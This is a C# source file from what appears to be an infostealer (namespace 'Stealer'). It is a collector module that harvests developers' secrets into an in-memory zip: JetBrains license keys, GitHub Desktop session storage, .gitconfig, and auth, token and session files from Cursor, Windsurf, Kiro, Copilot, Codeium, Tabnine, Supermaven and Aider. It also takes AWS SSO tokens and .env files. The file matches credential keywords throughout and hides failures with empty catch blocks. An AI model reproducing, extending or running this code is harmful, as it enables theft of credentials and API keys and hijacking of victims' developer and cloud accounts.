using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Stealer.Utils;

namespace Stealer.Collectors
{
    public class IDECollector
    {
        public static void Collect(InMemoryZip zip)
        {
            try
            {
                int collected = 0;

                // JetBrains (IntelliJ, PyCharm, WebStorm, etc)
                collected += CollectJetBrains(zip);

                // GitHub Desktop
                collected += CollectGitHubDesktop(zip);

                // VS Code
                collected += CollectVSCode(zip);

                // Git config
                collected += CollectGitConfig(zip);

                // AI Agents
                collected += CollectAIAgents(zip);

            }
            catch
            {
            }
        }

        private static int CollectJetBrains(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string jetBrainsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "JetBrains");
                if (!Directory.Exists(jetBrainsPath))
                    return 0;

                string[] allowedExtensions = { ".key", ".license" };

                foreach (var appDir in Directory.GetDirectories(jetBrainsPath))
                {
                    try
                    {
                        string appName = Path.GetFileName(appDir);
                        
                        foreach (var file in Directory.GetFiles(appDir))
                        {
                            try
                            {
                                if (allowedExtensions.Contains(Path.GetExtension(file)))
                                {
                                    string targetPath = $"IDE/JetBrains/{appName}/{Path.GetFileName(file)}";
                                    zip.AddFile(targetPath, File.ReadAllBytes(file));
                                    count++;
                                }
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }

            return count;
        }

        private static int CollectGitHubDesktop(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string githubPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "GitHub Desktop", "Local Storage", "leveldb");
                if (!Directory.Exists(githubPath))
                    return 0;

                string[] allowedExtensions = { ".log", ".ldb" };

                foreach (var file in Directory.GetFiles(githubPath))
                {
                    try
                    {
                        if (allowedExtensions.Contains(Path.GetExtension(file)))
                        {
                            string targetPath = $"IDE/GitHubDesktop/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                    }
                    catch { }
                }
            }
            catch { }

            return count;
        }

        private static int CollectVSCode(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string vscodePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Code", "User");
                if (!Directory.Exists(vscodePath))
                    return 0;

                // settings.json
                string settingsPath = Path.Combine(vscodePath, "settings.json");
                if (File.Exists(settingsPath))
                {
                    try
                    {
                        zip.AddFile("IDE/VSCode/settings.json", File.ReadAllBytes(settingsPath));
                        count++;
                    }
                    catch { }
                }

                // keybindings.json
                string keybindingsPath = Path.Combine(vscodePath, "keybindings.json");
                if (File.Exists(keybindingsPath))
                {
                    try
                    {
                        zip.AddFile("IDE/VSCode/keybindings.json", File.ReadAllBytes(keybindingsPath));
                        count++;
                    }
                    catch { }
                }

                // snippets
                string snippetsPath = Path.Combine(vscodePath, "snippets");
                if (Directory.Exists(snippetsPath))
                {
                    foreach (var file in Directory.GetFiles(snippetsPath, "*.json"))
                    {
                        try
                        {
                            string targetPath = $"IDE/VSCode/snippets/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectGitConfig(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string gitConfigPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".gitconfig");
                if (File.Exists(gitConfigPath))
                {
                    zip.AddFile("IDE/gitconfig.txt", File.ReadAllBytes(gitConfigPath));
                    count++;
                }
            }
            catch { }

            return count;
        }

        private static int CollectAIAgents(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                // Cursor
                count += CollectAIAgent(zip, appData, "Cursor");

                // Windsurf
                count += CollectAIAgent(zip, appData, "Windsurf");

                // Kiro
                count += CollectAIAgent(zip, appData, "Kiro");

                // VS Code Copilot
                count += CollectVSCodeCopilot(zip, appData);

                // Continue.dev
                count += CollectContinue(zip, appData);

                // Codeium
                count += CollectCodium(zip, appData);

                // Tabnine
                count += CollectTabnine(zip, appData);

                // Supermaven
                count += CollectSupermaven(zip, appData);

                // Aider
                count += CollectAider(zip);

                // AWS Credentials
                count += CollectAWS(zip);
            }
            catch { }

            return count;
        }

        private static int CollectAIAgent(InMemoryZip zip, string appData, string agentName)
        {
            int count = 0;
            try
            {
                string[] paths = {
                    Path.Combine(appData, agentName, "User", "globalStorage"),
                    Path.Combine(appData, agentName, "User")
                };

                // Ключевые слова для файлов с токенами/сессиями
                string[] sessionKeywords = { "auth", "token", "session", "login", "credential", "user", "account", "api-key", "apikey" };

                foreach (string dir in paths)
                {
                    if (!Directory.Exists(dir)) continue;

                    foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            string name = Path.GetFileName(file).ToLower();
                            string ext = Path.GetExtension(file).ToLower();

                            // Собираем только файлы с токенами/сессиями
                            bool isSessionFile = false;
                            
                            // Проверяем расширение
                            if (ext == ".json" || ext == ".db" || ext == ".sqlite")
                            {
                                // Проверяем имя файла на наличие ключевых слов
                                foreach (string keyword in sessionKeywords)
                                {
                                    if (name.Contains(keyword))
                                    {
                                        isSessionFile = true;
                                        break;
                                    }
                                }
                                
                                // Также собираем storage.json
                                if (name == "storage.json")
                                    isSessionFile = true;
                            }

                            if (!isSessionFile)
                                continue;

                            FileInfo fileInfo = new FileInfo(file);
                            if (fileInfo.Length > 5 * 1024 * 1024) // 5MB limit
                                continue;

                            string targetPath = $"IDE/{agentName}/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }

                    if (count > 0) break;
                }
            }
            catch { }

            return count;
        }

        private static int CollectVSCodeCopilot(InMemoryZip zip, string appData)
        {
            int count = 0;
            try
            {
                string[] vscodeDirs = { "Code", "Code - Insiders", "VSCodium" };
                string[] sessionKeywords = { "auth", "token", "session", "login", "credential", "user", "account", "api-key", "apikey" };

                foreach (string vscodeDir in vscodeDirs)
                {
                    string globalStorage = Path.Combine(appData, vscodeDir, "User", "globalStorage");
                    if (!Directory.Exists(globalStorage)) continue;

                    string[] copilotDirs = {
                        Path.Combine(globalStorage, "github.copilot"),
                        Path.Combine(globalStorage, "github.copilot-chat"),
                        Path.Combine(globalStorage, "github.copilot-nightly")
                    };

                    foreach (string dir in copilotDirs)
                    {
                        if (!Directory.Exists(dir)) continue;

                        foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                        {
                            try
                            {
                                string name = Path.GetFileName(file).ToLower();
                                
                                // Фильтруем только файлы с токенами/сессиями
                                bool isSessionFile = false;
                                foreach (string keyword in sessionKeywords)
                                {
                                    if (name.Contains(keyword))
                                    {
                                        isSessionFile = true;
                                        break;
                                    }
                                }

                                if (!isSessionFile)
                                    continue;

                                FileInfo fileInfo = new FileInfo(file);
                                if (fileInfo.Length > 1 * 1024 * 1024) // 1MB limit
                                    continue;

                                string targetPath = $"IDE/GitHubCopilot/{vscodeDir}/{Path.GetFileName(file)}";
                                zip.AddFile(targetPath, File.ReadAllBytes(file));
                                count++;
                            }
                            catch { }
                        }
                    }

                    // storage.json
                    string storageDb = Path.Combine(appData, vscodeDir, "User", "globalStorage", "storage.json");
                    if (File.Exists(storageDb))
                    {
                        try
                        {
                            string targetPath = $"IDE/GitHubCopilot/{vscodeDir}/storage.json";
                            zip.AddFile(targetPath, File.ReadAllBytes(storageDb));
                            count++;
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectContinue(InMemoryZip zip, string appData)
        {
            int count = 0;
            try
            {
                string[] vscodeDirs = { "Code", "Code - Insiders", "VSCodium" };
                string[] sessionKeywords = { "auth", "token", "session", "login", "credential", "user", "account", "api-key", "apikey", "config" };

                foreach (string vscodeDir in vscodeDirs)
                {
                    string continuePath = Path.Combine(appData, vscodeDir, "User", "globalStorage", "continue.continue");
                    if (!Directory.Exists(continuePath)) continue;

                    foreach (string file in Directory.GetFiles(continuePath, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            string name = Path.GetFileName(file).ToLower();
                            string ext = Path.GetExtension(file).ToLower();

                            if (ext != ".json" && ext != ".db" && ext != ".sqlite")
                                continue;

                            // Фильтруем только файлы с токенами/сессиями
                            bool isSessionFile = false;
                            foreach (string keyword in sessionKeywords)
                            {
                                if (name.Contains(keyword))
                                {
                                    isSessionFile = true;
                                    break;
                                }
                            }

                            if (!isSessionFile)
                                continue;

                            FileInfo fileInfo = new FileInfo(file);
                            if (fileInfo.Length > 5 * 1024 * 1024)
                                continue;

                            string targetPath = $"IDE/Continue/{vscodeDir}/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectCodium(InMemoryZip zip, string appData)
        {
            int count = 0;
            try
            {
                string[] vscodeDirs = { "Code", "Code - Insiders", "VSCodium" };
                string[] sessionKeywords = { "auth", "token", "session", "login", "credential", "user", "account", "api-key", "apikey" };

                foreach (string vscodeDir in vscodeDirs)
                {
                    string codeiumPath = Path.Combine(appData, vscodeDir, "User", "globalStorage", "codeium.codeium");
                    if (!Directory.Exists(codeiumPath)) continue;

                    foreach (string file in Directory.GetFiles(codeiumPath, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            string name = Path.GetFileName(file).ToLower();
                            
                            // Фильтруем только файлы с токенами/сессиями
                            bool isSessionFile = false;
                            foreach (string keyword in sessionKeywords)
                            {
                                if (name.Contains(keyword))
                                {
                                    isSessionFile = true;
                                    break;
                                }
                            }

                            if (!isSessionFile)
                                continue;

                            FileInfo fileInfo = new FileInfo(file);
                            if (fileInfo.Length > 1 * 1024 * 1024)
                                continue;

                            string targetPath = $"IDE/Codeium/{vscodeDir}/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }
                }

                // Standalone config
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string standaloneConfig = Path.Combine(userProfile, ".codeium");
                if (Directory.Exists(standaloneConfig))
                {
                    foreach (string file in Directory.GetFiles(standaloneConfig, "*", SearchOption.TopDirectoryOnly))
                    {
                        try
                        {
                            string name = Path.GetFileName(file).ToLower();
                            
                            bool isSessionFile = false;
                            foreach (string keyword in sessionKeywords)
                            {
                                if (name.Contains(keyword))
                                {
                                    isSessionFile = true;
                                    break;
                                }
                            }

                            if (!isSessionFile)
                                continue;

                            FileInfo fileInfo = new FileInfo(file);
                            if (fileInfo.Length > 1 * 1024 * 1024)
                                continue;

                            string targetPath = $"IDE/Codeium/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectTabnine(InMemoryZip zip, string appData)
        {
            int count = 0;
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string[] sessionKeywords = { "auth", "token", "session", "login", "credential", "user", "account", "api-key", "apikey", "config" };

                string[] standalonePaths = {
                    Path.Combine(appData, "TabNine"),
                    Path.Combine(userProfile, ".tabnine")
                };

                foreach (string dir in standalonePaths)
                {
                    if (!Directory.Exists(dir)) continue;

                    foreach (string file in Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly))
                    {
                        try
                        {
                            string name = Path.GetFileName(file).ToLower();
                            string ext = Path.GetExtension(file).ToLower();

                            if (ext != ".json" && ext != ".toml" && ext != "")
                                continue;

                            // Фильтруем только файлы с токенами/сессиями
                            bool isSessionFile = false;
                            foreach (string keyword in sessionKeywords)
                            {
                                if (name.Contains(keyword))
                                {
                                    isSessionFile = true;
                                    break;
                                }
                            }

                            if (!isSessionFile)
                                continue;

                            FileInfo fileInfo = new FileInfo(file);
                            if (fileInfo.Length > 1 * 1024 * 1024)
                                continue;

                            string targetPath = $"IDE/Tabnine/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }
                }

                // VS Code extension
                string[] vscodeDirs = { "Code", "Code - Insiders" };
                foreach (string vscodeDir in vscodeDirs)
                {
                    string dir = Path.Combine(appData, vscodeDir, "User", "globalStorage", "tabnine.tabnine-vscode");
                    if (!Directory.Exists(dir)) continue;

                    foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            string name = Path.GetFileName(file).ToLower();
                            
                            bool isSessionFile = false;
                            foreach (string keyword in sessionKeywords)
                            {
                                if (name.Contains(keyword))
                                {
                                    isSessionFile = true;
                                    break;
                                }
                            }

                            if (!isSessionFile)
                                continue;

                            FileInfo fileInfo = new FileInfo(file);
                            if (fileInfo.Length > 1 * 1024 * 1024)
                                continue;

                            string targetPath = $"IDE/Tabnine/{vscodeDir}/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectSupermaven(InMemoryZip zip, string appData)
        {
            int count = 0;
            try
            {
                string[] sessionKeywords = { "auth", "token", "session", "login", "credential", "user", "account", "api-key", "apikey", "config" };
                string supermavenPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Supermaven");
                if (!Directory.Exists(supermavenPath)) return 0;

                foreach (string file in Directory.GetFiles(supermavenPath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string name = Path.GetFileName(file).ToLower();
                        string ext = Path.GetExtension(file).ToLower();

                        if (ext != ".json" && ext != ".db" && ext != ".sqlite")
                            continue;

                        // Фильтруем только файлы с токенами/сессиями
                        bool isSessionFile = false;
                        foreach (string keyword in sessionKeywords)
                        {
                            if (name.Contains(keyword))
                            {
                                isSessionFile = true;
                                break;
                            }
                        }

                        if (!isSessionFile)
                            continue;

                        FileInfo fileInfo = new FileInfo(file);
                        if (fileInfo.Length > 5 * 1024 * 1024)
                            continue;

                        string targetPath = $"IDE/Supermaven/{Path.GetFileName(file)}";
                        zip.AddFile(targetPath, File.ReadAllBytes(file));
                        count++;
                    }
                    catch { }
                }
            }
            catch { }

            return count;
        }

        private static int CollectAider(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string[] sessionKeywords = { "auth", "token", "session", "login", "credential", "user", "account", "api-key", "apikey", "config" };
                string aiderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".aider");
                if (!Directory.Exists(aiderPath)) return 0;

                foreach (string file in Directory.GetFiles(aiderPath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string name = Path.GetFileName(file).ToLower();
                        string ext = Path.GetExtension(file).ToLower();

                        if (ext != ".json" && ext != ".db" && ext != ".sqlite" && ext != ".yml" && ext != ".yaml")
                            continue;

                        // Фильтруем только файлы с токенами/сессиями
                        bool isSessionFile = false;
                        foreach (string keyword in sessionKeywords)
                        {
                            if (name.Contains(keyword))
                            {
                                isSessionFile = true;
                                break;
                            }
                        }

                        if (!isSessionFile)
                            continue;

                        FileInfo fileInfo = new FileInfo(file);
                        if (fileInfo.Length > 5 * 1024 * 1024)
                            continue;

                        string targetPath = $"IDE/Aider/{Path.GetFileName(file)}";
                        zip.AddFile(targetPath, File.ReadAllBytes(file));
                        count++;
                    }
                    catch { }
                }
            }
            catch { }

            return count;
        }

        private static int CollectAWS(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                
                // Kiro auth token (AWS SSO cache)
                string awsSsoCache = Path.Combine(userProfile, ".aws", "sso", "cache");
                if (Directory.Exists(awsSsoCache))
                {
                    foreach (string file in Directory.GetFiles(awsSsoCache, "kiro-auth-token.json", SearchOption.AllDirectories))
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(file);
                            if (fileInfo.Length > 1 * 1024 * 1024) // 1MB limit
                                continue;

                            string targetPath = $"IDE/Kiro/{Path.GetFileName(file)}";
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectAIAgentConfig(InMemoryZip zip, string sourcePath, string agentName)
        {
            int count = 0;
            try
            {
                if (!Directory.Exists(sourcePath))
                    return 0;

                string[] configExtensions = { ".json", ".yaml", ".yml", ".toml", ".ini", ".conf", ".config", ".db", ".sqlite" };
                string[] excludeDirs = { "node_modules", "cache", "Cache", "logs", "Logs", "tmp", "temp" };

                void ProcessDirectory(string dir, string relativePath = "")
                {
                    try
                    {
                        // Пропускаем исключённые папки
                        string dirName = Path.GetFileName(dir);
                        if (excludeDirs.Contains(dirName))
                            return;

                        // Собираем файлы
                        foreach (var file in Directory.GetFiles(dir))
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(file);
                                
                                // Ограничение размера (5MB)
                                if (fileInfo.Length > 5 * 1024 * 1024)
                                    continue;

                                string ext = Path.GetExtension(file).ToLower();
                                string fileName = Path.GetFileName(file);

                                // Собираем конфиги и важные файлы
                                if (configExtensions.Contains(ext) || 
                                    fileName == "settings" || 
                                    fileName == "config" ||
                                    fileName.StartsWith(".env"))
                                {
                                    string targetPath = $"IDE/{agentName}/{relativePath}{fileName}";
                                    zip.AddFile(targetPath, File.ReadAllBytes(file));
                                    count++;
                                }
                            }
                            catch { }
                        }

                        // Рекурсивно обходим подпапки (максимум 3 уровня)
                        if (relativePath.Split(Path.DirectorySeparatorChar).Length < 3)
                        {
                            foreach (var subDir in Directory.GetDirectories(dir))
                            {
                                string subDirName = Path.GetFileName(subDir);
                                ProcessDirectory(subDir, relativePath + subDirName + Path.DirectorySeparatorChar);
                            }
                        }
                    }
                    catch { }
                }

                ProcessDirectory(sourcePath);
            }
            catch { }

            return count;
        }
    }
}
